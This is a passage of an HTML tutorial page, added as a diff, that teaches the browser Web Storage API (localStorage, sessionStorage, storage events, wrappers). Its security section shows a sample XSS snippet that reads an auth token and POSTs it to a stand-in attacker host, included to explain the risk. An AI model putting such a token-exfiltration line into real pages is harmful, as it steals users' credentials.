@@ -1,0 +1,1515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Storage API | HTML & CSS Mastery Course</title>
+    <meta name="description" content="Learn about the Web Storage API and how to store data locally in the browser.">
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    
+    <!-- Styles -->
+    <link rel="stylesheet" href="../../../assets/css/style.css">
+</head>
+<body data-page="18">
+    <!-- Glowing elements for futuristic effect -->
+    <div class="glow glow-1"></div>
+    <div class="glow glow-2"></div>
+    
+    <!-- Header -->
+    <header>
+        <div class="container grid">
+            <div class="logo">
+                <img src="../../../assets/images/logo.svg" alt="HTML & CSS Mastery">
+                <h1>HTML & CSS Mastery</h1>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="../../../index.html">Home</a></li>
+                    <li><a href="../basic/page1.html">HTML Basics</a></li>
+                    <li><a href="../professional/page13.html" class="active">Pro HTML</a></li>
+                    <li><a href="../../css/basic/page26.html">CSS Basics</a></li>
+                    <li><a href="../../css/professional/page38.html">Pro CSS</a></li>
+                </ul>
+                <button class="menu-toggle">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+            </nav>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <main>
+        <div class="container grid">
+            <!-- Sidebar Navigation -->
+            <div class="sidebar" style="grid-column: span 3;">
+                <h3>Professional HTML</h3>
+                <ul>
+                    <li><a href="page13.html">13. Advanced HTML Concepts</a></li>
+                    <li><a href="page14.html">14. HTML5 Semantic Elements</a></li>
+                    <li><a href="page15.html">15. HTML Forms Advanced</a></li>
+                    <li><a href="page16.html">16. HTML Media & Graphics</a></li>
+                    <li><a href="page17.html">17. HTML APIs</a></li>
+                    <li><a href="page18.html" class="active">18. Web Storage</a></li>
+                    <li><a href="page19.html">19. Geolocation API</a></li>
+                    <li><a href="page20.html">20. Drag & Drop API</a></li>
+                    <li><a href="page21.html">21. Web Workers</a></li>
+                    <li><a href="page22.html">22. Server-Sent Events</a></li>
+                    <li><a href="page23.html">23. WebSockets</a></li>
+                    <li><a href="page24.html">24. Responsive HTML</a></li>
+                    <li><a href="page25.html">25. HTML Accessibility</a></li>
+                </ul>
+                
+                <div class="progress-container" style="margin-top: 3rem;">
+                    <div class="progress-bar" style="width: 36%;"></div>
+                </div>
+                <p style="text-align: center;">Page 18 of 50</p>
+            </div>
+            
+            <!-- Content Area -->
+            <div class="content" style="grid-column: span 9;">
+                <section class="section animate" data-animation="fade-in">
+                    <h1>Web Storage API</h1>
+                    
+                    <div class="card">
+                        <h2>Introduction to Web Storage</h2>
+                        <p>The Web Storage API provides mechanisms for web applications to store data locally within the user's browser. Unlike cookies, web storage data is not sent to the server with every HTTP request, which makes it more suitable for storing larger amounts of data and can help improve website performance.</p>
+                        
+                        <p>Web Storage offers two mechanisms for storing data:</p>
+                        <ul>
+                            <li><strong>localStorage</strong>: Stores data with no expiration date. The data persists even after the browser is closed and reopened.</li>
+                            <li><strong>sessionStorage</strong>: Stores data for one session. The data is lost when the browser tab is closed.</li>
+                        </ul>
+                        
+                        <p>Both mechanisms provide a simple key-value storage system that's easy to use and accessible through JavaScript.</p>
+                        
+                        <div class="info-box">
+                            <h4>Web Storage vs. Cookies</h4>
+                            <p>Web Storage offers several advantages over cookies:</p>
+                            <ul>
+                                <li><strong>Storage capacity</strong>: Web Storage can typically store 5-10MB of data per domain, compared to cookies which are limited to about 4KB.</li>
+                                <li><strong>Server load</strong>: Web Storage data is not sent to the server with every HTTP request, reducing bandwidth usage.</li>
+                                <li><strong>Security</strong>: Web Storage data is not accessible by third-party sites and is not vulnerable to CSRF attacks.</li>
+                                <li><strong>API</strong>: Web Storage provides a simpler, more intuitive API compared to cookies.</li>
+                                <li><strong>Performance</strong>: Reading from Web Storage is faster than parsing cookie strings.</li>
+                            </ul>
+                            <p>However, cookies still have their place, especially for data that needs to be sent to the server with every request, such as authentication tokens.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>localStorage</h2>
+                        <p>The <code>localStorage</code> object stores data with no expiration date. The data will persist even after the browser is closed and reopened, making it ideal for long-term storage of user preferences, application state, or cached data.</p>
+                        
+                        <h3>Basic localStorage Operations</h3>
+                        <pre><code class="language-javascript">// Check if localStorage is supported
+if (typeof(Storage) !== "undefined") {
+    console.log("localStorage is supported");
+} else {
+    console.log("localStorage is not supported");
+}
+
+// Storing data
+localStorage.setItem("username", "JohnDoe");
+localStorage.setItem("theme", "dark");
+localStorage.setItem("lastVisit", new Date().toString());
+
+// Retrieving data
+const username = localStorage.getItem("username");
+console.log("Username:", username); // Output: Username: JohnDoe
+
+// Removing a specific item
+localStorage.removeItem("lastVisit");
+
+// Clearing all localStorage data
+localStorage.clear();
+
+// Getting the number of items in localStorage
+const itemCount = localStorage.length;
+console.log("Number of items:", itemCount);</code></pre>
+                        
+                        <h3>Storing Complex Data</h3>
+                        <p>localStorage can only store strings. To store objects or arrays, you need to convert them to strings using <code>JSON.stringify()</code> and parse them back using <code>JSON.parse()</code>:</p>
+                        
+                        <pre><code class="language-javascript">// Storing an object
+const user = {
+    id: 123,
+    name: "John Doe",
+    email: "john@example.com",
+    preferences: {
+        theme: "dark",
+        fontSize: "medium",
+        notifications: true
+    }
+};
+
+// Convert object to string and store
+localStorage.setItem("user", JSON.stringify(user));
+
+// Retrieve string and convert back to object
+const storedUser = JSON.parse(localStorage.getItem("user"));
+console.log("User name:", storedUser.name);
+console.log("User theme:", storedUser.preferences.theme);
+
+// Storing an array
+const todoList = [
+    { id: 1, text: "Learn HTML", completed: true },
+    { id: 2, text: "Learn CSS", completed: true },
+    { id: 3, text: "Learn JavaScript", completed: false }
+];
+
+// Convert array to string and store
+localStorage.setItem("todos", JSON.stringify(todoList));
+
+// Retrieve string and convert back to array
+const storedTodos = JSON.parse(localStorage.getItem("todos"));
+console.log("Number of todos:", storedTodos.length);
+
+// Filter completed todos
+const completedTodos = storedTodos.filter(todo => todo.completed);
+console.log("Completed todos:", completedTodos.length);</code></pre>
+                        
+                        <h3>Handling localStorage Errors</h3>
+                        <p>When working with localStorage, you should handle potential errors, such as exceeding the storage quota or accessing localStorage in private browsing mode:</p>
+                        
+                        <pre><code class="language-javascript">// Safe localStorage setter with error handling
+function setLocalStorageItem(key, value) {
+    try {
+        localStorage.setItem(key, value);
+        return true;
+    } catch (e) {
+        console.error("localStorage error:", e);
+        
+        if (e.name === "QuotaExceededError" || 
+            e.name === "NS_ERROR_DOM_QUOTA_REACHED") {
+            alert("Storage quota exceeded. Try clearing some space.");
+        } else {
+            alert("Could not save data. Private browsing mode may be enabled.");
+        }
+        
+        return false;
+    }
+}
+
+// Safe localStorage getter with error handling
+function getLocalStorageItem(key, defaultValue = null) {
+    try {
+        const item = localStorage.getItem(key);
+        return item !== null ? item : defaultValue;
+    } catch (e) {
+        console.error("localStorage error:", e);
+        return defaultValue;
+    }
+}
+
+// Example usage
+const success = setLocalStorageItem("settings", JSON.stringify({
+    theme: "dark",
+    fontSize: 16
+}));
+
+if (success) {
+    console.log("Settings saved successfully");
+}
+
+const settings = JSON.parse(getLocalStorageItem("settings", "{}"));
+console.log("Theme:", settings.theme || "default");</code></pre>
+                        
+                        <h3>Checking Available Space</h3>
+                        <p>You can estimate the available localStorage space using this technique:</p>
+                        
+                        <pre><code class="language-javascript">function getLocalStorageSize() {
+    let total = 0;
+    
+    for (let key in localStorage) {
+        if (localStorage.hasOwnProperty(key)) {
+            total += localStorage[key].length * 2; // UTF-16 uses 2 bytes per character
+        }
+    }
+    
+    return total;
+}
+
+function getLocalStorageLimit() {
+    if (!localStorage) {
+        return 0;
+    }
+    
+    let testKey = 'size-test';
+    let testValue = '';
+    let limit = 0;
+    
+    try {
+        // Try to fill localStorage until it throws an error
+        while (true) {
+            testValue += '1'.repeat(1024 * 1024); // Add 1MB
+            localStorage.setItem(testKey, testValue);
+            limit = testValue.length * 2; // UTF-16 uses 2 bytes per character
+        }
+    } catch (e) {
+        localStorage.removeItem(testKey);
+        return limit;
+    }
+}
+
+// Example usage
+const usedSpace = getLocalStorageSize();
+console.log(`Used localStorage space: ${(usedSpace / 1024 / 1024).toFixed(2)} MB`);
+
+// Note: This is resource-intensive and should be used sparingly
+// const totalSpace = getLocalStorageLimit();
+// console.log(`Total localStorage space: ${(totalSpace / 1024 / 1024).toFixed(2)} MB`);</code></pre>
+                        
+                        <div class="info-box">
+                            <h4>localStorage Limitations</h4>
+                            <ul>
+                                <li><strong>Storage limit</strong>: Typically 5-10MB per domain, but varies by browser</li>
+                                <li><strong>String only</strong>: Can only store string values</li>
+                                <li><strong>Synchronous API</strong>: Operations block the main thread</li>
+                                <li><strong>No expiration mechanism</strong>: Data persists until explicitly removed</li>
+                                <li><strong>Same-origin policy</strong>: Data is accessible only from the same domain</li>
+                                <li><strong>No server access</strong>: Data is client-side only</li>
+                                <li><strong>Private browsing</strong>: May not work in private/incognito mode</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>sessionStorage</h2>
+                        <p>The <code>sessionStorage</code> object stores data for one session. The data is lost when the browser tab is closed. This makes it ideal for temporary data that should not persist between sessions, such as form data, shopping cart contents, or temporary authentication tokens.</p>
+                        
+                        <h3>Basic sessionStorage Operations</h3>
+                        <pre><code class="language-javascript">// Check if sessionStorage is supported
+if (typeof(Storage) !== "undefined") {
+    console.log("sessionStorage is supported");
+} else {
+    console.log("sessionStorage is not supported");
+}
+
+// Storing data
+sessionStorage.setItem("currentPage", "home");
+sessionStorage.setItem("scrollPosition", "250");
+sessionStorage.setItem("formData", JSON.stringify({
+    name: "John",
+    email: "john@example.com"
+}));
+
+// Retrieving data
+const currentPage = sessionStorage.getItem("currentPage");
+console.log("Current page:", currentPage); // Output: Current page: home
+
+// Removing a specific item
+sessionStorage.removeItem("scrollPosition");
+
+// Clearing all sessionStorage data
+sessionStorage.clear();
+
+// Getting the number of items in sessionStorage
+const itemCount = sessionStorage.length;
+console.log("Number of items:", itemCount);</code></pre>
+                        
+                        <h3>Use Cases for sessionStorage</h3>
+                        <p>sessionStorage is particularly useful for:</p>
+                        
+                        <pre><code class="language-javascript">// Example 1: Saving form data to prevent loss on page refresh
+document.querySelector('form').addEventListener('input', function(e) {
+    // Save form data as user types
+    const formData = {
+        name: document.getElementById('name').value,
+        email: document.getElementById('email').value,
+        message: document.getElementById('message').value
+    };
+    
+    sessionStorage.setItem('contactForm', JSON.stringify(formData));
+});
+
+// Restore form data when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    const savedForm = sessionStorage.getItem('contactForm');
+    
+    if (savedForm) {
+        const formData = JSON.parse(savedForm);
+        document.getElementById('name').value = formData.name || '';
+        document.getElementById('email').value = formData.email || '';
+        document.getElementById('message').value = formData.message || '';
+    }
+});
+
+// Example 2: Maintaining scroll position between page navigations
+window.addEventListener('beforeunload', function() {
+    sessionStorage.setItem('scrollPosition', window.scrollY);
+});
+
+window.addEventListener('load', function() {
+    const scrollPosition = sessionStorage.getItem('scrollPosition');
+    if (scrollPosition) {
+        window.scrollTo(0, parseInt(scrollPosition));
+    }
+});
+
+// Example 3: Multi-step form with back/forward navigation
+function saveFormStep(stepNumber, data) {
+    sessionStorage.setItem(`formStep${stepNumber}`, JSON.stringify(data));
+    sessionStorage.setItem('currentStep', stepNumber);
+}
+
+function loadFormStep(stepNumber) {
+    const stepData = sessionStorage.getItem(`formStep${stepNumber}`);
+    return stepData ? JSON.parse(stepData) : null;
+}
+
+function goToNextStep() {
+    const currentStep = parseInt(sessionStorage.getItem('currentStep') || '1');
+    const nextStep = currentStep + 1;
+    
+    // Save current step data
+    const formData = collectFormData(); // Your function to collect form data
+    saveFormStep(currentStep, formData);
+    
+    // Navigate to next step
+    window.location.href = `step${nextStep}.html`;
+}
+
+function goToPreviousStep() {
+    const currentStep = parseInt(sessionStorage.getItem('currentStep') || '1');
+    const prevStep = currentStep - 1;
+    
+    if (prevStep >= 1) {
+        window.location.href = `step${prevStep}.html`;
+    }
+}</code></pre>
+                        
+                        <h3>sessionStorage vs. localStorage</h3>
+                        <p>While sessionStorage and localStorage share the same API, they serve different purposes:</p>
+                        
+                        <div class="comparison-table">
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Feature</th>
+                                        <th>localStorage</th>
+                                        <th>sessionStorage</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Lifetime</td>
+                                        <td>Persists until explicitly deleted</td>
+                                        <td>Persists until tab/window is closed</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Storage Limit</td>
+                                        <td>~5-10MB per domain</td>
+                                        <td>~5-10MB per domain</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Scope</td>
+                                        <td>Shared across all tabs/windows from same origin</td>
+                                        <td>Limited to the tab/window where it was created</td>
+                                    </tr>
+                                    <tr>
+                                        <td>API</td>
+                                        <td>setItem, getItem, removeItem, clear, key, length</td>
+                                        <td>setItem, getItem, removeItem, clear, key, length</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Best For</td>
+                                        <td>User preferences, persistent app state, cached data</td>
+                                        <td>Form data, page state, temporary session data</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        
+                        <pre><code class="language-javascript">// Example: Using both localStorage and sessionStorage appropriately
+
+// User preferences (persistent) - use localStorage
+function saveUserPreferences(preferences) {
+    localStorage.setItem('userPreferences', JSON.stringify(preferences));
+}
+
+function getUserPreferences() {
+    const prefs = localStorage.getItem('userPreferences');
+    return prefs ? JSON.parse(prefs) : getDefaultPreferences();
+}
+
+// Shopping cart (session-based) - use sessionStorage
+function addToCart(product) {
+    let cart = getCart();
+    cart.push(product);
+    sessionStorage.setItem('shoppingCart', JSON.stringify(cart));
+}
+
+function getCart() {
+    const cart = sessionStorage.getItem('shoppingCart');
+    return cart ? JSON.parse(cart) : [];
+}
+
+function clearCart() {
+    sessionStorage.removeItem('shoppingCart');
+}</code></pre>
+                        
+                        <div class="info-box">
+                            <h4>sessionStorage Behavior Notes</h4>
+                            <ul>
+                                <li>When you duplicate a tab, the sessionStorage from the original tab is copied to the new tab</li>
+                                <li>When you navigate to a new page within the same tab, sessionStorage is preserved</li>
+                                <li>When you restore a closed tab (e.g., Ctrl+Shift+T), the sessionStorage is typically lost</li>
+                                <li>In some browsers, sessionStorage may persist during browser crashes or restarts if "restore session" is enabled</li>
+                                <li>Like localStorage, sessionStorage follows the same-origin policy</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>Storage Events</h2>
+                        <p>The Web Storage API provides a <code>storage</code> event that fires when localStorage (but not sessionStorage) is modified. This event is particularly useful for synchronizing data across multiple tabs or windows from the same origin.</p>
+                        
+                        <h3>Listening for Storage Changes</h3>
+                        <pre><code class="language-javascript">// Add event listener for storage changes
+window.addEventListener('storage', function(event) {
+    console.log('Storage changed!');
+    console.log('Key:', event.key);
+    console.log('Old value:', event.oldValue);
+    console.log('New value:', event.newValue);
+    console.log('Storage area:', event.storageArea === localStorage ? 'localStorage' : 'sessionStorage');
+    console.log('URL:', event.url);
+    
+    // Update UI based on the changed data
+    if (event.key === 'theme') {
+        applyTheme(event.newValue);
+    } else if (event.key === 'user') {
+        updateUserInfo(JSON.parse(event.newValue));
+    }
+});</code></pre>
+                        
+                        <h3>Important Notes About Storage Events</h3>
+                        <ul>
+                            <li>The storage event is <strong>not</strong> fired in the same tab/window that made the change</li>
+                            <li>It's only fired in other tabs/windows from the same origin</li>
+                            <li>The event is not fired for sessionStorage changes</li>
+                            <li>The event is not fired when using the <code>clear()</code> method</li>
+                        </ul>
+                        
+                        <h3>Cross-Tab Communication</h3>
+                        <p>You can use the storage event to implement basic cross-tab communication:</p>
+                        
+                        <pre><code class="language-javascript">// Tab A: Send a message to other tabs
+function sendMessage(message) {
+    localStorage.setItem('message', JSON.stringify({
+        text: message,
+        timestamp: new Date().getTime()
+    }));
+    // Immediately remove the item to allow sending the same message again
+    localStorage.removeItem('message');
+}
+
+// Tab B: Listen for messages
+window.addEventListener('storage', function(event) {
+    if (event.key === 'message' && event.newValue) {
+        const message = JSON.parse(event.newValue);
+        console.log(`Message received: ${message.text} (${new Date(message.timestamp).toLocaleTimeString()})`);
+        showNotification(message.text);
+    }
+});
+
+// Example usage in Tab A
+document.getElementById('sendBtn').addEventListener('click', function() {
+    const messageText = document.getElementById('messageInput').value;
+    if (messageText) {
+        sendMessage(messageText);
+        document.getElementById('messageInput').value = '';
+    }
+});</code></pre>
+                        
+                        <h3>Synchronizing Application State</h3>
+                        <p>The storage event can be used to keep application state in sync across multiple tabs:</p>
+                        
+                        <pre><code class="language-javascript">// Define a state management system
+const AppState = {
+    // Current state
+    state: {
+        theme: 'light',
+        user: null,
+        notifications: []
+    },
+    
+    // Initialize state from localStorage
+    init() {
+        const savedState = localStorage.getItem('appState');
+        if (savedState) {
+            this.state = JSON.parse(savedState);
+            this.applyState();
+        }
+        
+        // Listen for changes from other tabs
+        window.addEventListener('storage', (event) => {
+            if (event.key === 'appState' && event.newValue) {
+                this.state = JSON.parse(event.newValue);
+                this.applyState();
+            }
+        });
+    },
+    
+    // Update state and save to localStorage
+    update(newState) {
+        this.state = { ...this.state, ...newState };
+        localStorage.setItem('appState', JSON.stringify(this.state));
+        this.applyState();
+    },
+    
+    // Apply state to UI
+    applyState() {
+        // Update theme
+        document.body.className = this.state.theme;
+        
+        // Update user info
+        const userElement = document.getElementById('userInfo');
+        if (userElement) {
+            if (this.state.user) {
+                userElement.textContent = `Welcome, ${this.state.user.name}`;
+                userElement.style.display = 'block';
+            } else {
+                userElement.style.display = 'none';
+            }
+        }
+        
+        // Update notifications
+        const notifElement = document.getElementById('notifications');
+        if (notifElement) {
+            notifElement.innerHTML = '';
+            this.state.notifications.forEach(notif => {
+                const div = document.createElement('div');
+                div.textContent = notif.message;
+                div.className = `notification ${notif.type}`;
+                notifElement.appendChild(div);
+            });
+        }
+    }
+};
+
+// Initialize on page load
+document.addEventListener('DOMContentLoaded', () => {
+    AppState.init();
+});
+
+// Example usage
+document.getElementById('themeToggle').addEventListener('click', () => {
+    const newTheme = AppState.state.theme === 'light' ? 'dark' : 'light';
+    AppState.update({ theme: newTheme });
+});
+
+function login(userData) {
+    AppState.update({ 
+        user: userData,
+        notifications: [
+            ...AppState.state.notifications,
+            { type: 'success', message: 'Login successful!' }
+        ]
+    });
+}</code></pre>
+                        
+                        <div class="info-box">
+                            <h4>Storage Event Limitations</h4>
+                            <ul>
+                                <li>The storage event doesn't work for changes within the same tab</li>
+                                <li>It doesn't work for sessionStorage changes</li>
+                                <li>It doesn't provide a way to acknowledge receipt of the event</li>
+                                <li>For more complex cross-tab communication, consider using the BroadcastChannel API or SharedWorker</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>Web Storage Wrappers</h2>
+                        <p>To make working with Web Storage easier and safer, you can create wrapper functions or classes that handle common tasks like serialization, error handling, and expiration.</p>
+                        
+                        <h3>Simple Storage Wrapper</h3>
+                        <pre><code class="language-javascript">// Simple storage wrapper with error handling and JSON support
+const Storage = {
+    // Set item with automatic JSON stringification
+    set(key, value, useSession = false) {
+        try {
+            const storage = useSession ? sessionStorage : localStorage;
+            const serialized = JSON.stringify(value);
+            storage.setItem(key, serialized);
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    },
+    
+    // Get item with automatic JSON parsing
+    get(key, defaultValue = null, useSession = false) {
+        try {
+            const storage = useSession ? sessionStorage : localStorage;
+            const value = storage.getItem(key);
+            
+            if (value === null) {
+                return defaultValue;
+            }
+            
+            try {
+                return JSON.parse(value);
+            } catch (e) {
+                // If parsing fails, return the raw value
+                return value;
+            }
+        } catch (e) {
+            console.error('Storage error:', e);
+            return defaultValue;
+        }
+    },
+    
+    // Remove item
+    remove(key, useSession = false) {
+        try {
+            const storage = useSession ? sessionStorage : localStorage;
+            storage.removeItem(key);
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    },
+    
+    // Clear all items
+    clear(useSession = false) {
+        try {
+            const storage = useSession ? sessionStorage : localStorage;
+            storage.clear();
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    }
+};
+
+// Example usage
+Storage.set('user', { name: 'John', id: 123 }); // localStorage
+Storage.set('formData', { email: 'john@example.com' }, true); // sessionStorage
+
+const user = Storage.get('user');
+console.log(user.name); // John
+
+const formData = Storage.get('formData', {}, true); // sessionStorage with default
+console.log(formData.email); // john@example.com</code></pre>
+                        
+                        <h3>Advanced Storage Wrapper with Expiration</h3>
+                        <pre><code class="language-javascript">// Advanced storage wrapper with expiration support
+class StorageManager {
+    constructor(useSession = false) {
+        this.storage = useSession ? sessionStorage : localStorage;
+        this.isSession = useSession;
+    }
+    
+    // Set item with optional expiration
+    setItem(key, value, expiresInSeconds = null) {
+        try {
+            const item = {
+                value: value,
+                created: new Date().getTime()
+            };
+            
+            if (expiresInSeconds) {
+                item.expires = new Date().getTime() + (expiresInSeconds * 1000);
+            }
+            
+            this.storage.setItem(key, JSON.stringify(item));
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    }
+    
+    // Get item and check expiration
+    getItem(key, defaultValue = null) {
+        try {
+            const itemStr = this.storage.getItem(key);
+            
+            if (!itemStr) {
+                return defaultValue;
+            }
+            
+            const item = JSON.parse(itemStr);
+            
+            // Check if item has expired
+            if (item.expires && new Date().getTime() > item.expires) {
+                this.removeItem(key);
+                return defaultValue;
+            }
+            
+            return item.value;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return defaultValue;
+        }
+    }
+    
+    // Remove item
+    removeItem(key) {
+        try {
+            this.storage.removeItem(key);
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    }
+    
+    // Clear all items
+    clear() {
+        try {
+            this.storage.clear();
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    }
+    
+    // Get all keys
+    keys() {
+        const keys = [];
+        for (let i = 0; i < this.storage.length; i++) {
+            keys.push(this.storage.key(i));
+        }
+        return keys;
+    }
+    
+    // Clean expired items
+    cleanExpired() {
+        const now = new Date().getTime();
+        const keys = this.keys();
+        
+        for (const key of keys) {
+            try {
+                const itemStr = this.storage.getItem(key);
+                if (itemStr) {
+                    const item = JSON.parse(itemStr);
+                    if (item.expires && now > item.expires) {
+                        this.removeItem(key);
+                    }
+                }
+            } catch (e) {
+                console.error(`Error cleaning key ${key}:`, e);
+            }
+        }
+    }
+}
+
+// Create instances for localStorage and sessionStorage
+const localStore = new StorageManager(false);
+const sessionStore = new StorageManager(true);
+
+// Example usage
+// Store user data for 1 hour
+localStore.setItem('user', { name: 'John', id: 123 }, 3600);
+
+// Store temporary auth token for 15 minutes
+localStore.setItem('authToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...', 900);
+
+// Store shopping cart in session storage (no expiration)
+sessionStore.setItem('cart', [
+    { id: 1, name: 'Product 1', price: 29.99 },
+    { id: 2, name: 'Product 2', price: 49.99 }
+]);
+
+// Get user data
+const user = localStore.getItem('user');
+if (user) {
+    console.log(`Welcome back, ${user.name}!`);
+} else {
+    console.log('Please log in');
+}
+
+// Clean expired items (could be run periodically)
+localStore.cleanExpired();</code></pre>
+                        
+                        <h3>Storage Wrapper with Namespacing</h3>
+                        <p>To avoid key collisions when multiple applications or components use the same storage, you can implement namespacing:</p>
+                        
+                        <pre><code class="language-javascript">// Storage wrapper with namespacing
+class NamespacedStorage {
+    constructor(namespace, useSession = false) {
+        this.namespace = namespace;
+        this.storage = useSession ? sessionStorage : localStorage;
+    }
+    
+    // Create namespaced key
+    _getKey(key) {
+        return `${this.namespace}:${key}`;
+    }
+    
+    // Set item
+    setItem(key, value) {
+        try {
+            const namespacedKey = this._getKey(key);
+            this.storage.setItem(namespacedKey, JSON.stringify(value));
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    }
+    
+    // Get item
+    getItem(key, defaultValue = null) {
+        try {
+            const namespacedKey = this._getKey(key);
+            const value = this.storage.getItem(namespacedKey);
+            
+            if (value === null) {
+                return defaultValue;
+            }
+            
+            return JSON.parse(value);
+        } catch (e) {
+            console.error('Storage error:', e);
+            return defaultValue;
+        }
+    }
+    
+    // Remove item
+    removeItem(key) {
+        try {
+            const namespacedKey = this._getKey(key);
+            this.storage.removeItem(namespacedKey);
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    }
+    
+    // Clear all items in this namespace
+    clear() {
+        try {
+            const keys = [];
+            const prefix = `${this.namespace}:`;
+            
+            // Find all keys in this namespace
+            for (let i = 0; i < this.storage.length; i++) {
+                const key = this.storage.key(i);
+                if (key.startsWith(prefix)) {
+                    keys.push(key);
+                }
+            }
+            
+            // Remove all found keys
+            keys.forEach(key => this.storage.removeItem(key));
+            
+            return true;
+        } catch (e) {
+            console.error('Storage error:', e);
+            return false;
+        }
+    }
+    
+    // Get all keys in this namespace
+    keys() {
+        const result = [];
+        const prefix = `${this.namespace}:`;
+        
+        for (let i = 0; i < this.storage.length; i++) {
+            const key = this.storage.key(i);
+            if (key.startsWith(prefix)) {
+                result.push(key.substring(prefix.length));
+            }
+        }
+        
+        return result;
+    }
+}
+
+// Example usage with different namespaces
+const userStorage = new NamespacedStorage('user');
+const cartStorage = new NamespacedStorage('cart', true); // sessionStorage
+const settingsStorage = new NamespacedStorage('settings');
+
+// Each storage operates independently
+userStorage.setItem('profile', { name: 'John', email: 'john@example.com' });
+cartStorage.setItem('items', [{ id: 1, quantity: 2 }]);
+settingsStorage.setItem('theme', 'dark');
+
+// Keys are namespaced in the actual storage
+// localStorage contains: 'user:profile', 'settings:theme'
+// sessionStorage contains: 'cart:items'
+
+console.log(userStorage.keys()); // ['profile']
+console.log(settingsStorage.keys()); // ['theme']
+
+// Clear only user settings
+userStorage.clear(); // Only removes 'user:profile', leaves 'settings:theme'</code></pre>
+                        
+                        <div class="info-box">
+                            <h4>Best Practices for Storage Wrappers</h4>
+                            <ul>
+                                <li>Always include error handling to catch quota exceeded errors</li>
+                                <li>Implement automatic serialization/deserialization for objects and arrays</li>
+                                <li>Consider adding expiration functionality for cache-like data</li>
+                                <li>Use namespacing to avoid key collisions</li>
+                                <li>Provide fallbacks for when storage is unavailable</li>
+                                <li>Include methods to manage storage space and clean up old data</li>
+                                <li>Consider adding encryption for sensitive data (though client-side encryption has limitations)</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <h2>Security Considerations</h2>
+                        <p>When using Web Storage, it's important to understand the security implications and take appropriate precautions.</p>
+                        
+                        <h3>What Not to Store</h3>
+                        <p>Web Storage is not suitable for storing sensitive information because it's accessible to any JavaScript running on the same origin. Avoid storing:</p>
+                        <ul>
+                            <li>Authentication tokens (especially long-lived ones)</li>
+                            <li>Passwords or password hashes</li>
+                            <li>Personal identifiable information (PII)</li>
+                            <li>Credit card details or financial information</li>
+                            <li>Access keys or API secrets</li>
+                        </ul>
+                        
+                        <h3>XSS Vulnerabilities</h3>
+                        <p>Web Storage is vulnerable to Cross-Site Scripting (XSS) attacks. If an attacker can inject JavaScript into your page, they can access all Web Storage data for that origin:</p>
+                        
+                        <pre><code class="language-javascript">// Malicious script in an XSS attack could do:
+const sensitiveData = localStorage.getItem('authToken');
+fetch('https://evil-site.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({ token: sensitiveData })
+});</code></pre>
+                        
+                        <h3>Content Security Policy</h3>
+                        <p>Implement a Content Security Policy (CSP) to help mitigate XSS attacks:</p>
+                        
+                        <pre><code class="language-html">&lt;!-- In your HTML --&gt;
+&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'"&gt;</code></pre>
+                        
+                        <pre><code class="language-javascript">// Or in your server response headers
+// Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
+                        
+                        <h3>Data Validation</h3>
+                        <p>Always validate data retrieved from Web Storage before using it:</p>
+                        
+                        <pre><code class="language-javascript">// Get user settings from localStorage
+function getUserSettings() {
+    try {
+        const settings = JSON.parse(localStorage.getItem('userSettings') || '{}');
+        
+        // Validate settings object
+        if (typeof settings !== 'object' || settings === null) {
+            return getDefaultSettings();
+        }
+        
+        // Validate individual properties
+        if (settings.theme && !['light', 'dark', 'system'].includes(settings.theme)) {
+            settings.theme = 'system'; // Default if invalid
+        }
+        
+        if (settings.fontSize && (typeof settings.fontSize !== 'number' || 
+                                 settings.fontSize < 8 || 
+                                 settings.fontSize > 32)) {
+            settings.fontSize = 16; // Default if invalid
+        }
+        
+        return settings;
+    } catch (e) {
+        console.error('Error parsing user settings:', e);
+        return getDefaultSettings();
+    }
+}</code></pre>
+                        
+                        <h3>Encrypting Sensitive Data</h3>
+                        <p>If you must store somewhat sensitive data, consider encrypting it. Note that client-side encryption has limitations since the decryption key must also be accessible to the client:</p>
+                        
+                        <pre><code class="language-javascript">// Simple encryption example using CryptoJS library
+// Note: This is not suitable for truly sensitive data
+// &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"&gt;&lt;/script&gt;
+
+const SecureStorage = {
+    // Encryption key (in a real app, this would be derived from user input or other sources)
+    // WARNING: Hardcoding the key like this provides very limited security
+    _encryptionKey: 'your-secret-key',
